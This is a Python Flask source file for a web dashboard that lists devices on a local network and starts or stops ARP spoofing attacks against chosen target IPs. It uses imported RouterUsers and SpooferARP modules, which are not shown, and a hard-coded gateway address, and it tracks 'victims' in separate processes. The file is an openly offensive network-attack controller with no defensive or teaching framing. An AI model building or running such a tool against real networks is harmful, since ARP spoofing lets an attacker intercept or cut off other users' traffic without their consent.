from flask import *
from RouterUsers import RouterUsers
from ArpSpoofer import SpooferARP
import json
from flask_cors import CORS
import time
import os
from werkzeug.utils import secure_filename
import re
import mimetypes
import uuid

from multiprocessing import Process


app = Flask(__name__)


cur_victims = {}

cur_spoofed_ips = []


def attack_thread(target, gateway):
   
    try:
        sp = SpooferARP(gateway, target).launch()
    except Exception as ee:
        print('thread err',ee)


@app.route('/get_online', methods=['GET'])
def get_online():
    global cur_spoofed_ips
    online_users = RouterUsers().getOnlineUsers()
    online_users_with_spoof = []
    
    try:

        for online_user in online_users:
            online_user['spoofed'] = online_user['ip'] in cur_spoofed_ips
            online_users_with_spoof.append(online_user)
            

        print(online_users_with_spoof)
        
        
    except Exception as ee:
        print('error here', ee)

    response = app.response_class(
        response=json.dumps(online_users_with_spoof),
        status=200,
        mimetype='application/json'
    )
    return response


@app.route('/')
def home():

    return render_template('home.html')


@app.route('/spoof', methods=['POST'])
def spoof():
    data = {'error': True, 'msg': ''}

    try:
        gateway = '192.168.1.1'
        target = request.form['target']
        attack_type = request.form['type']

        if target not in cur_victims.keys():
            cur_victims.setdefault(target, Process(target=attack_thread, args=(target, gateway,)))

        if attack_type == 'spoof':
            if not cur_victims[target].is_alive():
                cur_victims[target].start()
                print(target, "spoofing...")
                if target not in cur_spoofed_ips:
                    print('spoofing', target)
                    cur_spoofed_ips.append(target)
                data['error'] = False
                data['msg'] = 'spoofing ' + target
            else:
                print("already attacking...")
                data['msg'] = 'already attacking'

        else:

            if cur_victims[target].is_alive():
                cur_victims[target].terminate()
                cur_victims[target] = Process(target=attack_thread, args=(target, gateway,))
                print(target, "restored")
                cur_spoofed_ips.remove(target)
                data['error'] = False
                data['msg'] = 'restored'
            else:
                print("it is not running yet!")
                data['msg'] = 'it is not running yet'

    except Exception as ee:
        print('spoofer', ee)
        pass

    response = app.response_class(
        response=json.dumps(data),
        status=200,
        mimetype='application/json'
    )
    return response


@app.route('/get_spoofed')
def get_spoofed():
    #print(cur_spoofed_ips)
    data = {'spoofed': cur_spoofed_ips}

    try:
        pass
    except Exception as ee:
        print('spoofed', ee)
        pass

    response = app.response_class(
        response=json.dumps(data),
        status=200,
        mimetype='application/json'
    )
    return response


if __name__ == '__main__':
    os.system("explorer http://127.0.0.1:5000/")
    app.run()#debug=True  # host='0.0.0.0', port=5000, threaded=True

    
